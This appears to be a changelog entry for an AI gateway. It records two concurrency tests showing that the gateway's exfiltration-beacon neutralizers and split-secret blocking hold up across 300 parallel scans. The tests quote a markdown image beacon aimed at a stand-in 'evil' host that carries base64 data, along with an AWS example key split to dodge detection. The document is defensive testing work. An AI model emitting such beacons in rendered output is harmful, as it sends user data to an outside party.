# CHG-0101 — render-leak neutralization + cross-block split-block proven concurrency-safe (item-20)

**Change-id:** CHG-0101
**Date:** 2026-07-03
**Severity:** N/A (verification + regression-lock; zero defects found — the guardrails hold under concurrency).
**Area:** HARDEN 1.4 / item 20 "1.4 guardrails holding under peak load" — the CONCURRENCY dimension, extended to the CHG-0096–0100 additions.
**Files:** `gateway/ai_mesh_gateway/tests/test_mcp_scan_concurrency_safety.py` (+2 tests).
**Whose work it touches:** none (test-only); backstops the render-leak neutralizers (`_neutralize_exfil_deep` / `_neutralize_render_leaks`) and the cross-block split-block (`_result_has_split_secret`) added in CHG-0096–0100.

## Why (which part of the mandate)

CHG-0090 proved the plaintext-redaction chain concurrency-safe, but it predates the render-leak neutralization (CHG-0096/0097/0099 — exfil beacons + markdown-split/encoded PII) and the cross-block split-secret block (CHG-0100). Those run in the HOT scan path — the neutralizers via module-level compiled regexes (read-only) + JSON walk, the split check via pure detection over a per-result block concatenation. If any of that were mutated per-scan or shared across coroutines without isolation, a race could TORN/INTERLEAVE a neutralization (one call's beacon surviving because a neighbour clobbered shared state) or CROSS-CONTAMINATE outputs. A single-call unit test cannot catch this; the 300–500-sandbox live scale stays host-blocked, but the concurrency-SAFETY is provable here.

## What it does

Two new tests fire **300 concurrent** `_scan_tool_result_floor` calls (`asyncio.gather`), across 10 orgs:

1. `test_concurrent_render_leak_neutralization_no_cross_contamination` — each call carries a UNIQUE benign token (`MARKER####ZZZ`), a UNIQUE base64 exfil beacon (`![x](https://evil…/?d=<b64-of-call-i>)`), and a markdown-split secret (`AKIA**IOSFODNN7**EXAMPLE`). Asserts, per call: the benign token SURVIVES; the exfil beacon is DEFANGED (no live `![…](…evil…)`); the markdown-split secret does NOT reconstruct on render; and NO call's output contains ANY OTHER call's token (zero cross-contamination).
2. `test_concurrent_cross_block_split_all_blocked` — each call carries a valid AWS key split across two content blocks. Asserts ALL 300 are BLOCKED with the `cross_block_split_secret` meta.

## Result

**0 lost tokens, 0 surviving beacons, 0 reconstructed secrets, 0 cross-contamination; 300/300 splits blocked** → the CHG-0096–0100 guardrails are stateless / isolation-safe under concurrency (neutralizers pure over read-only compiled regexes, split detection per-result). A durable regression backstop: a future edit introducing shared mutable state or a torn neutralization into the hot path flips this red.

## Verify

```
cd gateway
./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_scan_concurrency_safety.py -q   # 4 passed
./.venv/bin/python -m pytest ai_mesh_gateway/tests -q                                        # 1604 passed, 0 failed
```
Broker regression: `services/mcp-broker && .venv/bin/python -m pytest tests -q -k "not websocket"` → 108 passed.

## Scope / honesty note

This proves concurrency-SAFETY of the render-leak + split-block guardrails (no cross-contamination / torn-neutralization race), NOT the full 300–500-sandbox / 5k–10k-concurrent-call live stress (items 14–20), which remains host-blocked and owned by the live load harnesses. It is the dimension of item 20 that IS runnable on this VM, now extended to cover the CHG-0096–0100 additions.
